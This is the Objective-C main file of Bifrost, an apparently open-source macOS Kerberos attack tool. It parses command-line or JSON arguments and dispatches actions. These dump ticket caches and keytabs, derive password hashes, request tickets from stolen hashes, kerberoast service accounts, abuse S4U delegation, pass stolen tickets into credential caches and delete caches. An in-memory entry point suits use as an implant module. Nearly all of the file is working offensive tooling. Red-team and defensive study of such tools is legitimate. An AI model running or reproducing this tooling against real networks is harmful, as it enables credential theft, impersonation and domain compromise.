//
//  main.m
//  bifrostconsole
//
//  Created by @its_a_feature_ on 10/14/19.
//  Copyright © 2019 Cody Thomas (@its_a_feature_). All rights reserved.
//

#import <Foundation/Foundation.h>
#import "bifrost.h"
NSString* printHelp(){
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    [output appendString:[[NSString alloc] initWithFormat:@"\nUsage:\n./bifrost -action [dump | list | askhash | describe | asktgt | asktgs | s4u | ptt | remove | asklkdcdomain]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For dump action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-source [tickets | keytab]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\tfor keytab, optional -path to specify a keytab\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\tfor tickets, optional -name to specify a ccache entry to dump\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For list action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t no other options are necessary\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For askhash action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-username a.test -password 'mypassword' -domain DOMAIN.COM\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t optionally specify -enctype [aes256 | aes128 | rc4] or get all of them\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t optionally specify -bpassword 'base64 of password' in case there might be issues with parsing or special characters\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For asktgt action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-username a.test -domain DOMAIN.COM\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t if using a plaintext password, specify -password 'password'\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t if using a hash, specify -enctype [aes256 | aes128 | rc4] -hash [hash_here]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -LKDCIP to connect to an LKDC instance for a domain that's in the format of LKDC:SHA1...\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t if using a keytab, specify -enctype and -keytab [keytab path] to pull a specific hash from the keytab\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -LKDCIP to connect to an LKDC instance for a domain that's in the format of LKDC:SHA1...\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t\t\t optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For describe action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-ticket base64KirbiTicket\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For asktgs action:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-ticket [base64 of TGT]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-service [comma separated list of SPNs]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -connectDomain to connect to a domain other than the one specified in the ticket\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -serviceDomain to request a service ticket in a domain other than the one specified in the ticket\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -kerberoast true to indicate a request for rc4 instead of aes256\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -LKDCIP to connect to an LKDC instance for a domain that's in the format of LKDC:SHA1...\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For s4u:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-ticket [base64 of TGT]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-targetUser [target user in current domain, or targetuser@domain for a different domain]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-spn [target SPN] (if this isn't specified, just a forwardable S4U2Self ticket is requested as targetUser)\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -connectDomain [domain or host to connect to]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For ptt:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t-ticket [base64 of kirbi ticket]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -name [name] to import the ticket into a specific credential cache\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t optionally specify -name new to import the ticket into a new credential cache\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For remove:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t for tickets: -source tickets -name [name here] (removes an entire ccache)\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t for keytabs: -source keytab -principal [principal name] (removes all entries for that principal)\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t for keytabs: optionally specify -name to not use the default keytab\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t you can't remove a specific ccache principal entry since it seems to not be implemented in heimdal\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For asklkdcdomain:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t -LKDCIP [remote IP address here]\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"For storelkdcinfo:\n"]];
    [output appendString:[[NSString alloc] initWithFormat:@"\t -username [username] -LKDCIP [remote host IP] -password [user's password] -cacheName [cache name to store info]"]];
    return output;
}
NSDictionary* get_arguments_from_json_string(char* arguments){
    NSString* jsonString = [[NSString alloc] initWithCString:arguments encoding:NSUTF8StringEncoding];
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error;
    NSDictionary* jsonObject = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
    if (error) {
        @throw @"Error parsing JSON";
    }
    return jsonObject;
}
NSDictionary* get_arguments_from_cli(int argc, const char * argv[]){
    NSMutableDictionary* jsonData = [[NSMutableDictionary alloc] init];
    
    NSUserDefaults *arguments = [NSUserDefaults standardUserDefaults];
    //NSMutableDictionary* jsonData = [[NSMutableDictionary alloc] init];
    [jsonData setValue:[arguments stringForKey:@"action"] forKey:@"action"];
    [jsonData setValue:[arguments stringForKey:@"ticket"] forKey:@"ticket"];
    [jsonData setValue:[arguments stringForKey:@"source"] forKey:@"source"];
    [jsonData setValue:[arguments stringForKey:@"name"] forKey:@"name"];
    [jsonData setValue:[arguments stringForKey:@"path"] forKey:@"path"];
    [jsonData setValue:[arguments stringForKey:@"enctype"] forKey:@"enctype"];
    [jsonData setValue:[arguments stringForKey:@"username"] forKey:@"username"];
    [jsonData setValue:[arguments stringForKey:@"password"] forKey:@"password"];
    [jsonData setValue:[arguments stringForKey:@"bpassword"] forKey:@"bpassword"];
    [jsonData setValue:[arguments stringForKey:@"domain"] forKey:@"domain"];
    [jsonData setValue:[arguments stringForKey:@"tgtEnctype"] forKey:@"tgtEnctype"];
    if([arguments objectForKey:@"supportAll"]){
        if([arguments boolForKey:@"supportAll"]){
            jsonData[@"supportAll"] = @true;
        } else {
            jsonData[@"supportAll"] = @false;
        }
    }else{
        jsonData[@"supportAll"] = @true;
    }
    if([arguments objectForKey:@"kerberoast"]){
        if([arguments boolForKey:@"kerberoast"]){
            jsonData[@"kerberoast"] = @true;
        } else {
            jsonData[@"kerberoast"] = @false;
        }
    }else{
        jsonData[@"kerberoast"] = @false;
    }
    [jsonData setValue:[arguments stringForKey:@"connectDomain"] forKey:@"connectDomain"];
    [jsonData setValue:[arguments stringForKey:@"hash"] forKey:@"hash"];
    [jsonData setValue:[arguments stringForKey:@"keytab"] forKey:@"keytab"];
    [jsonData setValue:[arguments stringForKey:@"service"] forKey:@"service"];
    [jsonData setValue:[arguments stringForKey:@"LKDCIP"] forKey:@"LKDCIP"];
    [jsonData setValue:[arguments stringForKey:@"serviceDomain"] forKey:@"serviceDomain"];
    [jsonData setValue:[arguments stringForKey:@"principal"] forKey:@"principal"];
    [jsonData setValue:[arguments stringForKey:@"targetUser"] forKey:@"targetUser"];
    [jsonData setValue:[arguments stringForKey:@"spn"] forKey:@"spn"];
    [jsonData setValue:[arguments stringForKey:@"cacheName"] forKey:@"cacheName"];
    for(int i = 1; i < argc-1; i+=2){
        //printf("argv[%d]: %s\n", i, argv[i]);
        //printf("argv[%d]: %s\n", i+1, argv[i+1]);
        NSString* key = [[NSString alloc] initWithUTF8String:argv[i]+1];
        NSString* value = [[NSString alloc] initWithUTF8String:argv[i+1]];
        if([key isEqualToString:@"supportAll"] || [key isEqualToString:@"kerberoast"]){
            if([value isEqualToString:@"true"]){
                [jsonData setValue:@true forKey:key];
            } else {
                [jsonData setValue:@false forKey:key];
            }
        } else {
            [jsonData setValue:value forKey:key];
        }
    }
    //NSLog(@"argumentData: %@", jsonData);
    return jsonData;
}
const char* run(NSDictionary* arguments){
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    [output appendString:[[NSString alloc] initWithFormat:@
    " ___         ___                   _     \n"
    "(  _`\\  _  /'___)                 ( )_  \n"
    "| (_) )(_)| (__  _ __   _     ___ | ,_)  \n"
    "|  _ <'| || ,__)( '__)/'_`\\ /',__)| |   \n"
    "| (_) )| || |   | |  ( (_) )\\__, \\| |_ \n"
    "(____/'(_)(_)   (_)  `\\___/'(____/\\__) \n"
           "\n"]];
    bifrost* test = [[bifrost alloc] init];
    NSString* action = @"";
    @try{
        action = [arguments objectForKey:@"action"];
        if( action == nil ){
            return printHelp().UTF8String;
        }
        if( [action isEqualToString:@"describe"] ){
            if( [arguments objectForKey:@"ticket"]){
                NSString* encodedTicket = [arguments objectForKey:@"ticket"];
                NSData* decodedTicket = [[NSData alloc] initWithBase64EncodedString:encodedTicket options:0];
                if(decodedTicket.bytes == nil){
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to base64 decode ticket\n"]];
                    return output.UTF8String;
                }
                Krb5Ticket ticket = parseKirbi(decodedTicket);
                NSString* description = describeTicket(ticket);
                [output appendString:[[NSString alloc] initWithFormat:@"%s\n", description.UTF8String]];
            } else {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing -ticket parameter\n"]];
                return output.UTF8String;
            }
        }
        else if( [action isEqualToString:@"dump"]){
            NSString* source;
            if( [arguments objectForKey:@"source"] ){
                source = [arguments objectForKey:@"source"];
            } else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing source [tickets|keytab]\n"]];
                return output.UTF8String;
            }
            if( [source isEqualToString:@"tickets"] ){
                //read the local ticket cache via klist apis to Kirbi
                if( [arguments objectForKey:@"name"] ){
                    NSString* cache = [arguments objectForKey:@"name"];
                    NSString* result = [test dumpCredentialsToKirbiCCache:cache.UTF8String Destroy:false];
                    [output appendString:result];
                }else{
                    NSString* result = [test dumpCredentialsToKirbiCCache:NULL Destroy:false];
                    [output appendString:result];
                }
                
            } else if( [source isEqualToString:@"keytab"] ){
                //read a specified keytab file and parse out the entries, optionally giving an NSString of a path to a keytab file
                if( [arguments objectForKey:@"path"] ){
                    NSString* path = [arguments objectForKey:@"path"];
                    NSString* result = [test ktutilKeyTabPath:path];
                    [output appendString:result];
                }else{
                    NSString* result = [test ktutilKeyTabPath:NULL];
                    [output appendString:result];
                }
            } else {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Unknown source\n"]];
                return output.UTF8String;
            }
        }
        else if( [action isEqualToString:@"askhash"]){
            uint enctype = 0;
            NSString* username;
            NSString* password;
            NSString* domain;
            if( [arguments objectForKey:@"enctype"] ){
                NSString* enctypeString = [arguments objectForKey:@"enctype"];
                enctype = [test getEncValueFromEnctype:enctypeString];
            }
            if( [arguments objectForKey:@"username"] ){
                username = [arguments objectForKey:@"username"];
            } else {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing username\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"password"] ){
                password = [arguments objectForKey:@"password"];
            } else if([ arguments objectForKey:@"bpassword"] ){
                NSString* encodedPassword = [arguments objectForKey:@"bpassword"];
                password = [[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:encodedPassword options:0] encoding:NSUTF8StringEncoding];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing-password\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"domain"] ){
                domain = [arguments objectForKey:@"domain"];
                domain = [domain uppercaseString];
            } else {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing domain\n"]];
                return output.UTF8String;
            }
            NSString *key = [test genPasswordHashPassword:password.UTF8String Length:password.length Enc:enctype Username:username Domain:domain Pretty:TRUE];
            [output appendString:[[NSString alloc] initWithFormat:@"\n%s\n", key.UTF8String]];
        }
        else if( [action isEqualToString:@"asktgt"]){
            uint enctype = 0;
            uint tgtEnctype = 0;
            NSString* username = NULL;
            NSString* password = NULL;
            NSString* domain = NULL;
            NSString* hash = NULL;
            NSString* keytab = NULL;
            NSString* connectDomain = NULL;
            NSString* LKDCIP = NULL;
            bool supportAll = true;
            if( [arguments objectForKey:@"enctype"] ){
                NSString* enctypeString = [arguments objectForKey:@"enctype"];
                enctype = [test getEncValueFromEnctype:enctypeString];
                if(enctype == 0){
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Unknown encryption type, use: [aes256 | aes128 | rc4 | des3]\n"]];
                    return output.UTF8String;
                }
            }
            if( [arguments objectForKey:@"tgtEnctype"] ){
                NSString* enctypeString = [arguments objectForKey:@"tgtEnctype"];
                tgtEnctype = [test getEncValueFromEnctype:enctypeString];
                if(tgtEnctype == 0){
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Unknown encryption type, use: [aes256 | aes128 | rc4 | des3]\n"]];
                    return output.UTF8String;
                }
            }
            if( [arguments objectForKey:@"username"] ){
                username = [arguments objectForKey:@"username"];
            }
            else {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing username\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"supportAll"] ){
                supportAll = [arguments objectForKey:@"supportAll"];
            }
            if( [arguments objectForKey:@"domain"] ){
                domain = [arguments objectForKey:@"domain"];
                domain = [domain uppercaseString];
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments objectForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments objectForKey:@"LKDCIP"];
            }
            if( [arguments objectForKey:@"password"] ){
                //TODO: go back and make this generate a password hash instead
                //get a user's TGT with a username, password, and domain
                password = [arguments objectForKey:@"password"];
            }
            else if([ arguments objectForKey:@"bpassword"] ){
                NSString* encodedPassword = [arguments objectForKey:@"bpassword"];
                password = [[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:encodedPassword options:0] encoding:NSUTF8StringEncoding];
            }
            if(password != NULL){
                hash = [test genPasswordHashPassword:password.UTF8String Length:password.length Enc:ENCTYPE_AES256_CTS_HMAC_SHA1_96 Username:username Domain:domain Pretty:FALSE];
                enctype = ENCTYPE_AES256_CTS_HMAC_SHA1_96;
            }
            if( [arguments objectForKey:@"hash"]){
                //get a user's TGT with a username, hash, and domain
                hash = [arguments objectForKey:@"hash"];
                if(enctype == 0){
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Must supply -enctype [aes256|aes128|rc4|des3] with -hash to identify the type of hash supplied\n"]];
                    return output.UTF8String;
                }
            }
            else if( [arguments objectForKey:@"keytab"]){
                //use username and domain to find the right entry in the keytab
                keytab = [arguments objectForKey:@"keytab"];
                if( [keytab isEqualToString:@"default"]){
                    //use the default keytab to do this request
                    keytab = NULL;
                }
                NSString* principal = [[NSString alloc] initWithFormat:@"%s@%s", username.UTF8String, domain.UTF8String];
                hash = [test getKeyFromKeytab:keytab andPrincipal:principal withEnctype:enctype];
                [output appendString:[[NSString alloc] initWithFormat:@"[+] Using hash: %s\n", hash.UTF8String]];
            }
            else if(password == NULL) {
                [output appendString:[[NSString alloc] initWithFormat:@"[-] No hash or password supplied\n"]];
            }
            // perform normal Active Directory kerberos traffic based on the supplied data
            NSString* result;
            if( tgtEnctype != 0 ){
                //specify the desired end ticket encryption type if desired to be different than the hash's enc type and not negotiated
                [output appendString:[[NSString alloc] initWithFormat:@"[*] Requesting hash type: %d\n", tgtEnctype]];
                if(connectDomain == NULL){
                    result = [test askTGTConnectDomain:domain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:false TgtEnctype:tgtEnctype LKDCIP:LKDCIP];
                }else{
                    result = [test askTGTConnectDomain:connectDomain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:false TgtEnctype:tgtEnctype LKDCIP:LKDCIP];
                }
                
            }
            else{
                if(connectDomain == NULL){
                    result = [test askTGTConnectDomain:domain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:supportAll TgtEnctype:enctype LKDCIP:LKDCIP];
                }else{
                    result = [test askTGTConnectDomain:connectDomain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:supportAll TgtEnctype:enctype LKDCIP:LKDCIP];
                }
                
            }
            [output appendString:result];
            return output.UTF8String;
            
        }
        else if( [action isEqualToString:@"asktgs"] ){
            NSString* encodedTicket;
            NSString* services;
            NSString* serviceDomain = NULL;
            NSString* connectDomain = NULL;
            NSString* LKDCIP = NULL;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments objectForKey:@"ticket"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required parameter -ticket\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"service"] ){
                services = [arguments objectForKey:@"service"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required parameter -service\n"]];
                return output.UTF8String;
            }
            bool kerberoast = false;
            if( [arguments objectForKey:@"kerberoast"]){
                kerberoast = [[arguments objectForKey:@"kerberoast"] boolValue];
            }
            
            NSArray* serviceList = [services componentsSeparatedByString:@","];

            if( [arguments objectForKey:@"serviceDomain"] ){
                serviceDomain = [arguments objectForKey:@"serviceDomain"];
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments objectForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments objectForKey:@"LKDCIP"];
            }
            for(int i = 0; i < [serviceList count]; i++){
                NSString* service = (NSString*)[serviceList objectAtIndex:i];
                NSString* result = [test askTGSConnectDomain:connectDomain TGT:encodedTicket Service:service ServiceDomain:serviceDomain Kerberoast:kerberoast LKDCIP:LKDCIP];
                [output appendString:result];
            }
            return output.UTF8String;
        }
        else if( [action isEqualToString:@"list"] ){
            NSString* result = [test listAllCCaches];
            [output appendString:result];
        }
        else if( [action isEqualToString:@"ptt"] ){
            NSString* encodedTicket;
            NSString* ccache;
            //Krb5Ticket ticket;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments objectForKey:@"ticket"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required parameter: -ticket\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"name"] ){
                ccache = [arguments objectForKey:@"name"];
            }else{
                ccache = @"new";
            }
            NSString* result = [test importCred:encodedTicket ToCache:ccache];
            [output appendString:result];
        }
        else if( [action isEqualToString:@"remove"] ){
            NSString* source;
            NSString* name = NULL;;
            NSString* principal = @"";
            if( [arguments objectForKey:@"source"]){
                source = [arguments objectForKey:@"source"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required argument -source\n"]];
                return output.UTF8String;
            }
            if([source isEqualToString:@"tickets"]){
                if( [arguments objectForKey:@"name"] ){
                    name = [arguments objectForKey:@"name"];
                    /*
                    if([arguments objectForKey:@"principal"]){
                        principal = [arguments stringForKey:@"principal"];
                        [test removePrincipal:principal FromCacheName:name];
                    }else{
                        [test removeCacheName:name];
                    }*/
                    NSString* result = [test removeCacheName:name];
                    [output appendString:result];
                }else{
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required argument -name\n"]];
                    return output.UTF8String;
                }
            }
            else if([source isEqualToString:@"keytab"]){
                if( [arguments objectForKey:@"name"] ){
                    name = [arguments objectForKey:@"name"];
                }
                if( [arguments objectForKey:@"principal"] ){
                    principal = [arguments objectForKey:@"principal"];
                }else{
                    [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required field -principal\n"]];
                    return output.UTF8String;
                }
                NSString* result = [test removePrincipal:principal fromKeytab:name];
                [output appendString:result];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Unknown source\n"]];
            }
        }
        else if( [action isEqualToString:@"s4u"] ){
            NSString* encodedTicket;
            NSString* targetUser;
            NSString* spn;
            NSString* connectDomain = NULL;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments objectForKey:@"ticket"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required argument -ticket\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"targetUser"] ){
                targetUser = [arguments objectForKey:@"targetUser"];
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required argument -targetUser\n"]];
                return output.UTF8String;
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments objectForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"spn"] ){
                spn = [arguments objectForKey:@"spn"];
                //this means we're doing the full S4U2Self and S4U2Proxy scenario
                NSString* result = [test s4uTicket:encodedTicket ConnectDomain:connectDomain TargetUser:targetUser SPN:spn];
                [output appendString:result];
            }else{
                //this means we're just doing the S4U2Self scenario
                NSString* result = [test s4u2selfTicket:encodedTicket ConnectDomain:connectDomain TargetUser:targetUser];
                [output appendString:result];
            }
        }
        else if( [action isEqualToString:@"asklkdcdomain"] ){
            NSString* LKDCIP = NULL;
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments objectForKey:@"LKDCIP"];
            }
            else{
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Missing required parameter of LKDCIP\n"]];
            }
        
            NSString* result = [test askLKDCDomainByIP:LKDCIP];
            [output appendString:result];
        }
        else {
            return printHelp().UTF8String;
        }
        return output.UTF8String;
    }@catch(NSException* exception){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Final error: %s\n", exception.reason.UTF8String]];
        return output.UTF8String;
    }@catch(id errorMessage){
        NSString* exception = (NSString*)errorMessage;
        return exception.UTF8String;
    }
}
const char* execute_memory(char* args){
    @try{
        NSDictionary* arguments = get_arguments_from_json_string(args);
        return run(arguments);
    }@catch(id errorMessage){
        NSString* exception = (NSString*)errorMessage;
        return exception.UTF8String;
    }
}

int main(int argc, const char * argv[]) {
    @try{
        NSDictionary* arguments = get_arguments_from_cli(argc, argv);
        printf("%s", run(arguments));
        return 0;
    }@catch(id errorMessage){
        NSString* exception = (NSString*)errorMessage;
        printf("%s", exception.UTF8String);
        return -1;
    }
    
}

